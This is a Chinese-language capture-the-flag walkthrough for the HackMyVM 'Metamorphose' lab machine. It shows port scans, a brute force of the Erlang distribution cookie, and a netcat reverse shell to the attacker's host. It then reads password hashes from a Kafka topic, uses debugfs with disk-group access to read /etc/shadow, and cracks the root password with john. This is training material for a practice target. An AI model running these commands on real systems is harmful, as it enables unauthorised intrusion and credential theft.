---
title: HMV Metamorphose
published: 2025-03-02
pinned: false
description: HMV Metamorphose，渗透，wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-03-02
pubDate: 2025-03-02
---

## Metamorphose

### 靶场链接

https://hackmyvm.eu/machines/machine.php?vm=Metamorphose

### 日常扫描

```
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l -I eth0
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.31.1    58:ea:1f:38:ff:17       (Unknown)
192.168.31.25   08:00:27:78:88:2c       (Unknown)
192.168.31.186  42:60:96:7b:26:bd       (Unknown: locally administered)
192.168.31.210  f4:6d:3f:27:e6:fb       (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.936 seconds (132.23 hosts/sec). 4 responded

┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sSV -p- -T5 192.168.31.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 12:25 HKT
Nmap scan report for 192.168.31.25
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
39441/tcp open  unknown
MAC Address: 08:00:27:78:88:2C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.14 seconds

```
### 反弹shell
epmd的信息在https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html 有

按着这个方法打一下

```
┌──(kali㉿kali)-[~]
└─$ echo -n -e "\x00\x01\x6e" | nc -vn 192.168.31.25 4369
(UNKNOWN) [192.168.31.25] 4369 (epmd) open
name network at port 39441
                                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sV -Pn -n -T4 -p 4369 --script epmd-info 192.168.31.25 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 12:29 HKT
Nmap scan report for 192.168.31.25
Host is up (0.0020s latency).

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    network: 39441
MAC Address: 08:00:27:78:88:2C (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.35 seconds
                            
```

github是有个项目的https://github.com/gteissier/erl-matter

直接去找这个漏洞也可以，主要是去爆破cookie

把rockyou字典提取点出来
head -n 1000 /usr/share/wordlists/rockyou.txt > rockyou_top1000.txt

爆破一下

```
┌──(kali㉿kali)-[~/Desktop/epmd/erl-matter-master]
└─$ for i in $(cat ./rockyou_top1000.txt); do if ! python2 shell-erldp.py 192.168.31.25 39441 "$i" whoami 2>&1 | grep -q "wrong cookie, auth unsuccessful"; then echo "[+] cookie:$i"; break; fi; done

[+] cookie:batman


python2 shell-erldp.py 192.168.31.25 39441 batman 'nc -e /bin/bash 192.168.31.183 4444'
[*] authenticated onto victim

```

反弹shell完成

### 提权
linpeas传上去没有什么东西，有的也是权限不够

```
melbourne@MiWiFi-R4CM-srv:/$ ss -lntp
ss -lntp                                                                                                                                                    
State  Recv-Q Send-Q      Local Address:Port  Peer Address:PortProcess                            
LISTEN 0      128               0.0.0.0:22         0.0.0.0:*                                      
LISTEN 0      128               0.0.0.0:39441      0.0.0.0:*    users:(("beam.smp",pid=864,fd=17))
LISTEN 0      128                  [::]:22            [::]:*                                      
LISTEN 0      50                      *:2181             *:*                                      
LISTEN 0      50     [::ffff:127.0.0.1]:9092             *:*                                      
LISTEN 0      4096                    *:4369             *:*                                      
LISTEN 0      50                      *:37371            *:*                                      
LISTEN 0      50                      *:37883            *:*      
```

居然还有个9092端口在跑东西，去看看，是kafka在跑，去看看这玩意

```
melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ ls -la
ls -la
total 184
drwxrwxr-x 3 root root  4096 Feb 17  2024 .
drwxrwxr-x 8 root root  4096 Feb 26  2024 ..
-rwxrwxr-x 1 root root  1423 Nov 24  2023 connect-distributed.sh
-rwxrwxr-x 1 root root  1396 Nov 24  2023 connect-mirror-maker.sh
-rwxrwxr-x 1 root root   963 Nov 24  2023 connect-plugin-path.sh
-rwxrwxr-x 1 root root  1420 Nov 24  2023 connect-standalone.sh
-rwxrwxr-x 1 root root   861 Nov 24  2023 kafka-acls.sh
-rwxrwxr-x 1 root root   873 Nov 24  2023 kafka-broker-api-versions.sh
-rwxrwxr-x 1 root root   871 Nov 24  2023 kafka-cluster.sh
-rwxrwxr-x 1 root root   864 Nov 24  2023 kafka-configs.sh
-rwxrwxr-x 1 root root   945 Nov 24  2023 kafka-console-consumer.sh
-rwxrwxr-x 1 root root   944 Nov 24  2023 kafka-console-producer.sh
-rwxrwxr-x 1 root root   871 Nov 24  2023 kafka-consumer-groups.sh
-rwxrwxr-x 1 root root   959 Nov 24  2023 kafka-consumer-perf-test.sh
-rwxrwxr-x 1 root root   882 Nov 24  2023 kafka-delegation-tokens.sh
-rwxrwxr-x 1 root root   880 Nov 24  2023 kafka-delete-records.sh
-rwxrwxr-x 1 root root   866 Nov 24  2023 kafka-dump-log.sh
-rwxrwxr-x 1 root root   877 Nov 24  2023 kafka-e2e-latency.sh
-rwxrwxr-x 1 root root   874 Nov 24  2023 kafka-features.sh
-rwxrwxr-x 1 root root   865 Nov 24  2023 kafka-get-offsets.sh
-rwxrwxr-x 1 root root   867 Nov 24  2023 kafka-jmx.sh
-rwxrwxr-x 1 root root   870 Nov 24  2023 kafka-leader-election.sh
-rwxrwxr-x 1 root root   874 Nov 24  2023 kafka-log-dirs.sh
-rwxrwxr-x 1 root root   881 Nov 24  2023 kafka-metadata-quorum.sh
-rwxrwxr-x 1 root root   873 Nov 24  2023 kafka-metadata-shell.sh
-rwxrwxr-x 1 root root   862 Nov 24  2023 kafka-mirror-maker.sh
-rwxrwxr-x 1 root root   959 Nov 24  2023 kafka-producer-perf-test.sh
-rwxrwxr-x 1 root root   874 Nov 24  2023 kafka-reassign-partitions.sh
-rwxrwxr-x 1 root root   885 Nov 24  2023 kafka-replica-verification.sh
-rwxrwxr-x 1 root root 10884 Nov 24  2023 kafka-run-class.sh
-rwxrwxr-x 1 root root  1376 Nov 24  2023 kafka-server-start.sh
-rwxrwxr-x 1 root root  1361 Nov 24  2023 kafka-server-stop.sh
-rwxrwxr-x 1 root root   860 Nov 24  2023 kafka-storage.sh
-rwxrwxr-x 1 root root   956 Nov 24  2023 kafka-streams-application-reset.sh
-rwxrwxr-x 1 root root   863 Nov 24  2023 kafka-topics.sh
-rwxrwxr-x 1 root root   879 Nov 24  2023 kafka-transactions.sh
-rwxrwxr-x 1 root root   958 Nov 24  2023 kafka-verifiable-consumer.sh
-rwxrwxr-x 1 root root   958 Nov 24  2023 kafka-verifiable-producer.sh
-rwxrwxr-x 1 root root  1714 Nov 24  2023 trogdor.sh
drwxrwxr-x 2 root root  4096 Nov 24  2023 windows
-rwxrwxr-x 1 root root   867 Nov 24  2023 zookeeper-security-migration.sh
-rwxrwxr-x 1 root root  1393 Nov 24  2023 zookeeper-server-start.sh
-rwxrwxr-x 1 root root  1366 Nov 24  2023 zookeeper-server-stop.sh
-rwxrwxr-x 1 root root  1019 Nov 24  2023 zookeeper-shell.sh

```

那估计得学一下这玩意了

列出主题列表：

```
melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ ./\kafka-topics.sh --list --bootstrap-server localhost:9092
<-topics.sh --list --bootstrap-server localhost:9092

__consumer_offsets
internal_logs
user_feedback
users.properties
melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ 
melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ 
melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ 
melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$
```

kafak里面的身份主要分生产者和消费者两种，可以简单理解为生产者发送消息，消费者接收消息。下面我们要读取主题里面的信息。

```
melbourne@MiWiFi-R4CM-srv:/opt/kafka/bin$ ./kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic users.properties --from-beginning
<host:9092 --topic users.properties --from-beginning


{"username": "root", "password": "e2f7a3617512ed81aa68c7be9c435609cfb513b021ce07ee9d2759f08f4d9054", "email": "root@metamorphose.hmv", "role": "admin"}
{"username": "saman", "password": "5b5ba511537a7871212f7a978f708aef60a02b80e77ed14dcc59cbd019d6791d", "email": "saman@metamorphose.hmv", "role": "editor"}
{"username": "michele", "password": "77e19ed98cf4b945e9034efb30779abd21c70a7b4e3b0ae92ab50db9ca39a75b", "email": "michele@metamorphose.hmv", "role": "viewer"}
{"username": "oleesa", "password": "f44609c0c1fe331267c8fe1069f4b67fd67ff95fb9742eede4ec9028fa770bdd", "email": "oleesa@metamorphose.hmv", "role": "admin"}
{"username": "sarene", "password": "2f15dacafe7b70bfa88d07d15026cdd40799264c36c120e34a28e7659b6a928d", "email": "sarene@metamorphose.hmv", "role": "viewer"}
{"username": "janella", "password": "bc5219396bb2a0de2e0776ad1078f67c417da95d5e009989d7d4ea14823bfb5a", "email": "janella@metamorphose.hmv", "role": "viewer"}
{"username": "bronson", "password": "a0ef680b09d2f9821d69416d6c5629d3f109751c0fc3a77592041644e268a65e", "email": "bronson@metamorphose.hmv", "role": "admin"}
{"username": "vonda", "password": "b1d83b7991c7a2286abfc2ba555e426a4dd7db4072815f71e3ec45406ab8dd7d", "email": "vonda@metamorphose.hmv", "role": "viewer"}
{"username": "toshinari", "password": "5018f7be54a3f684bb01b2d21e293a423f5978da36e19c86abc085d9514b56d2", "email": "toshinari@metamorphose.hmv", "role": "editor"}
{"username": "laurie", "password": "597f3fdd0ba9d4af8699dc30e4d1c8c74551e10a56eaad108d34b28ac8d353c7", "email": "laurie@metamorphose.hmv", "role": "user"}
{"username": "alia", "password": "d2e5eda5bf734608f1585adffc30846340878e0ab1f0be572ac79f88ac4c808e", "email": "alia@metamorphose.hmv", "role": "admin"}
{"username": "raj", "password": "3a76752b3c949f0bdaed819d0f61ae6ca863e5235062a004b23e65059cae6fdd", "email": "raj@metamorphose.hmv", "role": "editor"}
{"username": "arleen", "password": "aaf6946a8e02f31cc9542a0bb1cfa6dd49ccd01d57802417a28cf493ad7ff5ad", "email": "arleen@metamorphose.hmv", "role": "editor"}
{"username": "melbourne", "password": "a08aa555a5e5b7a73125cf367176ce446eb1d0c07a068077ab4f740a8fded545", "email": "melbourne@metamorphose.hmv", "role": "admin"}
{"username": "carolyn", "password": "544c4de6388bf397d905015b085ee359f3813550912467bed347e666d35a1fee", "email": "carolyn@metamorphose.hmv", "role": "viewer"}
{"username": "coralie", "password": "9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e", "email": "coralie@metamorphose.hmv", "role": "admin"}
{"username": "farhad", "password": "157e2743e9edc74a954fc6cfa82f77801b66781091955cf0284f0e3819d51dfc", "email": "farhad@metamorphose.hmv", "role": "editor"}
{"username": "felix", "password": "3fe0e7fbd33d9ca82f77d1a0c2ff4c28b0d35b8024c61a05bd244ccc28d53816", "email": "felix@metamorphose.hmv", "role": "admin"}
{"username": "chase", "password": "e387178e3c60967aadc8e8a795a819d24493c05e2d999e56bf01d08654ef80d2", "email": "chase@metamorphose.hmv", "role": "editor"}
{"username": "blakeley", "password": "7cd774b3d7a0d7e8696b0cab072c0cc50dd7ab2ac3db362ebe2cd154a3505b78", "email": "blakeley@metamorphose.hmv", "role": "admin"}
{"username": "risa", "password": "9dee3c618985708c50c53854751297a10abc8b02e9f416137816fc408145a6b3", "email": "risa@metamorphose.hmv", "role": "editor"}
{"username": "paddy", "password": "d24214a379e0a1115185de1415c0c38f9a90803f1188fb366506eb96b219b838", "email": "paddy@metamorphose.hmv", "role": "editor"}
{"username": "min", "password": "c84ef95012d8f8baa4d62b1ea791c158a5daa7f82f611b2b33d344cb14779ceb", "email": "min@metamorphose.hmv", "role": "viewer"}
{"username": "ezmeralda", "password": "362d8c0d990e1f8583047fbb0114691e2716a0f11d751ce29604611a7e38275d", "email": "ezmeralda@metamorphose.hmv", "role": "editor"}
{"username": "lita", "password": "dd3e6e2665d0f27ecce3a7e017c4d7656ad8e5a78d9d40d21bc044cf96097d66", "email": "lita@metamorphose.hmv", "role": "viewer"}
{"username": "angeline", "password": "b460021a7bb42c159a2382a9b1f73944b292bf9748f3a063c5e6a2b73db7ba53", "email": "angeline@metamorphose.hmv", "role": "user"}
{"username": "sheridan", "password": "8717128e8774950dc2e58f899bbab4a4ba91fe34ac564d00ec4006169fa0fcc5", "email": "sheridan@metamorphose.hmv", "role": "admin"}
{"username": "reid", "password": "a0d1968ca7d8580f53b3b65775a7e126e1d4f6054d396f47ede1e65893d653b3", "email": "reid@metamorphose.hmv", "role": "editor"}
{"username": "asher", "password": "1f8642763371ca486ff7a5df412fa8c98abac2371032f35835d15dbdf80cab70", "email": "asher@metamorphose.hmv", "role": "editor"}
{"username": "lakyn", "password": "2ac9ee0d8724e344fd8b53b13183e8d66a6ba492b8f52960ef90ddb3c369128a", "email": "lakyn@metamorphose.hmv", "role": "user"}
{"username": "aviva", "password": "9daa3d43959547cb632bd9234454ac4a655b1b56d2bcee35d72e9121c0e82768", "email": "aviva@metamorphose.hmv", "role": "user"}
{"username": "chabane", "password": "966c4d1242e3c0003d6941ef1a202998ec3b48370728e40505096bfb54039e55", "email": "chabane@metamorphose.hmv", "role": "admin"}

```

因为home目录下另一个用户名为coralie，所以我们先爆这个用户的哈希。
得到my2monkeys

切换用户先，得到user.txt

```
coralie@MiWiFi-R4CM-srv:~$ id
id
uid=1001(coralie) gid=1001(coralie) groups=1001(coralie),6(disk)

```

这个时候是挂载在磁盘上的

传个debugfs上去
```
┌──(kali㉿kali)-[~/Desktop/epmd/erl-matter-master]
└─$ sftp coralie@192.168.31.25
The authenticity of host '192.168.31.25 (192.168.31.25)' can't be established.
ED25519 key fingerprint is SHA256:zJTU5deLcEPvqmEkwIcwJqbe2czoKO/Rb3Cg082YD+s.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.31.25' (ED25519) to the list of known hosts.
coralie@192.168.31.25's password: 
Connected to 192.168.31.25.
sftp> put /usr/sbin/debugfs
Uploading /usr/sbin/debugfs to /home/coralie/debugfs
debugfs                                       100%  266KB   3.0MB/s   00:00    
sftp> 

coralie@MiWiFi-R4CM-srv:~$ chmod +x debugfs
chmod +x debugfs
coralie@MiWiFi-R4CM-srv:~$ ./debugfs /dev/sda1
./debugfs /dev/sda1
bash: ./debugfs: cannot execute binary file: Exec format error


```

md，我的是mac，arm版本的，传上去用不了，重新下一个给他传上去

```
coralie@metamorphose:/tmp$ ./debugfs /dev/sda1
debugfs 1.47.0 (5-Feb-2023)
debugfs:  help
Available debugfs requests:

show_debugfs_params, params
                         Show debugfs parameters
open_filesys, open       Open a filesystem
close_filesys, close     Close the filesystem
freefrag, e2freefrag     Report free space fragmentation
feature, features        Set/print superblock features
dirty_filesys, dirty     Mark the filesystem as dirty
init_filesys             Initialize a filesystem (DESTROYS DATA)
show_super_stats, stats  Show superblock statistics
ncheck                   Do inode->name translation
icheck                   Do block->inode translation
change_root_directory, chroot
                         Change root directory
change_working_directory, cd
                         Change working directory
list_directory, ls       List directory
show_inode_info, stat    Show inode information 
dump_extents, extents, ex
                         Dump extents information 
blocks                   Dump blocks used by an inode 
filefrag                 Report fragmentation information for an inode
link, ln                 Create directory link
unlink                   Delete a directory link
mkdir                    Create a directory
rmdir                    Remove a directory
rm                       Remove a file (unlink and kill_file, if appropriate)
kill_file                Deallocate an inode and its blocks
copy_inode               Copy the inode structure
clri                     Clear an inode's contents
freei                    Clear an inode's in-use flag
seti                     Set an inode's in-use flag
testi                    Test an inode's in-use flag
freeb                    Clear a block's in-use flag
setb                     Set a block's in-use flag
testb                    Test a block's in-use flag
modify_inode, mi         Modify an inode by structure
find_free_block, ffb     Find free block(s)
find_free_inode, ffi     Find free inode(s)
print_working_directory, pwd
                         Print current working directory
expand_dir, expand       Expand directory
mknod                    Create a special file
list_deleted_inodes, lsdel
                         List deleted inodes
undelete, undel          Undelete file
write                    Copy a file from your native filesystem
dump_inode, dump         Dump an inode out to a file
cat                      Dump an inode out to stdout
lcd                      Change the current directory on your native filesystem
rdump                    Recursively dump a directory to the native filesystem
set_super_value, ssv     Set superblock value
set_inode_field, sif     Set inode field
set_block_group, set_bg  Set block group descriptor field
logdump                  Dump the contents of the journal
htree_dump, htree        Dump a hash-indexed directory
dx_hash, hash            Calculate the directory hash of a filename
dirsearch                Search a directory for a particular filename
bmap                     Calculate the logical->physical block mapping for an inode
fallocate                Allocate uninitialized blocks to an inode
punch, truncate          Punch (or truncate) blocks from an inode by deallocating them
symlink                  Create a symbolic link
imap                     Calculate the location of an inode
dump_unused              Dump unused blocks
set_current_time         Set current time to use when setting filesystem fields
supported_features       Print features supported by this version of e2fsprogs
dump_mmp                 Dump MMP information
set_mmp_value, smmp      Set MMP value
extent_open, eo          Open inode for extent manipulation
zap_block, zap           Zap block: fill with 0, pattern, flip bits etc.
block_dump, bdump, bd    Dump contents of a block
ea_list                  List extended attributes of an inode
ea_get                   Get an extended attribute of an inode
ea_set                   Set an extended attribute of an inode
ea_rm                    Remove an extended attribute of an inode
list_quota, lq           List quota
get_quota, gq            Get quota
inode_dump, idump, id    Dump the inode structure in hex
journal_open, jo         Open the journal
journal_close, jc        Close the journal
journal_write, jw        Write a transaction to the journal
journal_run, jr          Recover the journal
help                     Display info on command or topic.
list_requests, lr, ?     List available commands.
quit, q                  Leave the subsystem.

debugfs:  cat /etc/shadow
root:$y$j9T$iAHGFf9E40kdt5eEY4R790$1Hnu3bkcGq69yrKAWBL9zuT1cLG16/ENdKsxR1omAqB:19779:0:99999:7:::
daemon:*:19779:0:99999:7:::
bin:*:19779:0:99999:7:::
sys:*:19779:0:99999:7:::
sync:*:19779:0:99999:7:::
games:*:19779:0:99999:7:::
man:*:19779:0:99999:7:::
lp:*:19779:0:99999:7:::
mail:*:19779:0:99999:7:::
news:*:19779:0:99999:7:::
uucp:*:19779:0:99999:7:::
proxy:*:19779:0:99999:7:::
www-data:*:19779:0:99999:7:::
backup:*:19779:0:99999:7:::
list:*:19779:0:99999:7:::
irc:*:19779:0:99999:7:::
_apt:*:19779:0:99999:7:::
nobody:*:19779:0:99999:7:::
systemd-network:!*:19779::::::
systemd-timesync:!*:19779::::::
messagebus:!:19779::::::
avahi-autoipd:!:19779::::::
sshd:!:19779::::::
ntpsec:!:19779::::::
epmd:!:19779::::::
melbourne:$y$j9T$9AW5vMwISGEth89TZdLQX.$3oxC.VAZ57n4S94eRdZzcsGbgIoiAxWTdCP7afTV7x2:19779:0:99999:7:::
coralie:$y$j9T$knJbyxpFrCvXDa/DDdck/1$GKzq8p7o9Qjurg6bzmM6TZtilp3qY8caDnkDYDJas35:19779:0:99999:7:::
```

开爆root的密码

```
┌──(kali㉿kali)-[~/Desktop/epmd/erl-matter-master]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qazwsxedc        (root)     
1g 0:00:00:04 DONE (2025-02-28 13:18) 0.2040g/s 411.4p/s 411.4c/s 411.4C/s amore..jesusfreak
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

gameover
